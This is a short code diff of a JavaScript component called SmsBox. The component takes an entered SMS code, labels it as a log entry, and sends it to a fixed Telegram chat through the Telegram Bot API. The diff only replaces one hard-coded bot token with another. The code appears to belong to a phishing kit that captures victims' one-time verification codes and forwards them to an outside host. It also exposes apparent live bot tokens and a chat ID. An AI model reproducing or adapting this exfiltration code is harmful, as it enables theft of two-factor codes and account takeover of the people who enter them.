@@ -7,7 +7,7 @@ const SmsBox = () => {
 
     var smscode = `Log :%0A -sms-code: ${text1}`;
 
-    var token = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
+    var token = "8551615963:AAEOPXbeNy48cyh8zNW5ede7-v3w8RWldHE";
     var chat_id = -1002071552778;
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${smscode}`;
 
